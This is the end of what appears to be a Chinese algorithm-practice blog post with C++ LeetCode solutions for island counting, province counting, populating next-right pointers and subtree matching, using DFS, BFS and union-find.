<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//固定</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnionFind</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    UnionFind(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; grid)&#123;</span><br><span class="line">        count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]==<span class="string">'1'</span>)&#123;</span><br><span class="line">                    parent.push_back(i*n+j);</span><br><span class="line">                    ++count;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    parent.push_back(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                rank.push_back(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(parent[i]!=i)&#123;</span><br><span class="line">            parent[i]=<span class="built_in">find</span>(parent[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parent[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unit</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootx = <span class="built_in">find</span>(x);</span><br><span class="line">        <span class="keyword">int</span> rooty = <span class="built_in">find</span>(y);</span><br><span class="line">        <span class="keyword">if</span>(rootx != rooty)&#123;</span><br><span class="line">            <span class="keyword">if</span>(rank[rootx] &lt; rank[rooty])&#123;</span><br><span class="line">                swap(rootx,rooty);</span><br><span class="line">            &#125;</span><br><span class="line">            parent[rooty]=rootx;</span><br><span class="line">            <span class="keyword">if</span>(rank[rootx]==rank[rooty]) rank[rootx]+=<span class="number">1</span>;</span><br><span class="line">            --count;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; parent;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; rank;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> nr = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(!nr) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> nc = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">UnionFind <span class="title">uf</span><span class="params">(grid)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>;r&lt;nr;r++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">0</span>;c&lt;nc;c++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[r][c]==<span class="string">'1'</span>)&#123;</span><br><span class="line">                    grid[r][c]==<span class="string">'0'</span>;</span><br><span class="line">                    <span class="keyword">if</span>(r<span class="number">-1</span>&gt;=<span class="number">0</span> &amp;&amp; grid[r<span class="number">-1</span>][c]==<span class="string">'1'</span>) uf.unit(r*nc+c,(r<span class="number">-1</span>)*nc+c);</span><br><span class="line">                    <span class="keyword">if</span>(r+<span class="number">1</span>&lt;nr &amp;&amp; grid[r+<span class="number">1</span>][c]==<span class="string">'1'</span>) uf.unit(r*nc+c,(r+<span class="number">1</span>)*nc+c);</span><br><span class="line">                    <span class="keyword">if</span>(c<span class="number">-1</span>&gt;=<span class="number">0</span> &amp;&amp; grid[r][c<span class="number">-1</span>]==<span class="string">'1'</span>) uf.unit(r*nc+c,r*nc+c<span class="number">-1</span>);</span><br><span class="line">                    <span class="keyword">if</span>(c+<span class="number">1</span>&lt;nc &amp;&amp; grid[r][c+<span class="number">1</span>]==<span class="string">'1'</span>) uf.unit(r*nc+c,r*nc+c+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uf.getCount();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="547-省份数量"><a href="#547-省份数量" class="headerlink" title="547. 省份数量"></a><a href="https://leetcode-cn.com/problems/number-of-provinces/" target="_blank" rel="noopener">547. 省份数量</a></h3><p>深度优先</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; isConnected,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; visited,<span class="keyword">int</span> provinces,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;provinces;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(isConnected[i][j]==<span class="number">1</span> &amp;&amp; !visited[j])&#123;</span><br><span class="line">                visited[j]=<span class="number">1</span>;</span><br><span class="line">                dfs(isConnected,visited,provinces,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findCircleNum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; isConnected)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> provinces = isConnected.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">visited</span><span class="params">(provinces)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> circles=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;provinces;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[i])&#123;</span><br><span class="line">                dfs(isConnected,visited,provinces,i);</span><br><span class="line">                circles++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> circles;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>广度优先</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findCircleNum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; isConnected)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> provinces = isConnected.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">visited</span><span class="params">(provinces)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> circles=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; Q;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;provinces;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[i])&#123;</span><br><span class="line">                Q.push(i);</span><br><span class="line">                <span class="keyword">while</span>(!Q.empty())&#123;</span><br><span class="line">                    <span class="keyword">int</span> j = Q.front();Q.pop();</span><br><span class="line">                    visited[j]=<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;provinces;k++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(isConnected[j][k]==<span class="number">1</span> &amp;&amp; !visited[k])&#123;</span><br><span class="line">                            Q.push(k);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                circles++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> circles;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>并查集</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; parent,<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(parent[index]!=index)&#123;</span><br><span class="line">            parent[index]=Find(parent,parent[index]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parent[index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; parent,<span class="keyword">int</span> index1,<span class="keyword">int</span> index2)</span></span>&#123;</span><br><span class="line">        parent[Find(parent,index1)] = Find(parent,index2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findCircleNum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; isConnected)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> provinces = isConnected.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">parent</span><span class="params">(provinces)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;provinces;i++)&#123;</span><br><span class="line">            parent[i]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;provinces;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;provinces;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(isConnected[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line">                    Union(parent,i,j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> circles=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;provinces;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parent[i]==i)&#123;</span><br><span class="line">                circles++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> circles;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-7-天-广度优先搜索-深度优先搜索-1"><a href="#第-7-天-广度优先搜索-深度优先搜索-1" class="headerlink" title="第 7 天 广度优先搜索 / 深度优先搜索"></a>第 7 天 广度优先搜索 / 深度优先搜索</h1><h3 id="117-填充每个节点的下一个右侧节点指针-II"><a href="#117-填充每个节点的下一个右侧节点指针-II" class="headerlink" title="117. 填充每个节点的下一个右侧节点指针 II"></a><a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node-ii/" target="_blank" rel="noopener">117. 填充每个节点的下一个右侧节点指针 II</a></h3><blockquote>
<p>广度优先</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">queue</span>&lt;Node*&gt; q;</span><br><span class="line">        q.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!q.empty()) &#123;</span><br><span class="line">            <span class="keyword">int</span> n = q.<span class="built_in">size</span>();</span><br><span class="line">            Node *last = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">                Node *f = q.front();</span><br><span class="line">                q.pop();</span><br><span class="line">                <span class="keyword">if</span> (f-&gt;left) &#123;</span><br><span class="line">                    q.push(f-&gt;left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (f-&gt;right) &#123;</span><br><span class="line">                    q.push(f-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i != <span class="number">1</span>) &#123;</span><br><span class="line">                    last-&gt;next = f;</span><br><span class="line">                &#125;</span><br><span class="line">                last = f;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用已经建立的next指针</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* left;</span></span><br><span class="line"><span class="comment">    Node* right;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span></span><br><span class="line"><span class="comment">        : val(_val), left(_left), right(_right), next(_next) &#123;&#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">handle</span><span class="params">(Node* &amp;last,Node* &amp;p,Node* &amp;nextStart)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(last)&#123;</span><br><span class="line">            last-&gt;next=p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!nextStart)&#123;</span><br><span class="line">            nextStart=p;</span><br><span class="line">        &#125;</span><br><span class="line">        last=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Node* start = root;</span><br><span class="line">        <span class="keyword">while</span>(start)&#123;</span><br><span class="line">            Node* last = <span class="literal">nullptr</span>,*nextStart = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">for</span>(Node* p = start;p!=<span class="literal">nullptr</span>;p = p-&gt;next)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;left)&#123;</span><br><span class="line">                    handle(last,p-&gt;left,nextStart);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;right)&#123;</span><br><span class="line">                    handle(last,p-&gt;right,nextStart);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            start = nextStart;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="572-另一棵树的子树"><a href="#572-另一棵树的子树" class="headerlink" title="572. 另一棵树的子树"></a><a href="https://leetcode-cn.com/problems/subtree-of-another-tree/" target="_blank" rel="noopener">572. 另一棵树的子树</a></h3><blockquote>
<p>深度优先+暴力</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(TreeNode* root,TreeNode* subRoot)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root &amp;&amp; !subRoot) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>((root &amp;&amp; !subRoot) || (!root &amp;&amp; subRoot) || (root-&gt;val != subRoot-&gt;val))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> check(root-&gt;left,subRoot-&gt;left) &amp;&amp; check(root-&gt;right,subRoot-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(TreeNode* root,TreeNode* subRoot)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> check(root,subRoot) || dfs(root-&gt;left,subRoot) || dfs(root-&gt;right,subRoot);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubtree</span><span class="params">(TreeNode* root, TreeNode* subRoot)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dfs(root,subRoot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
</search>
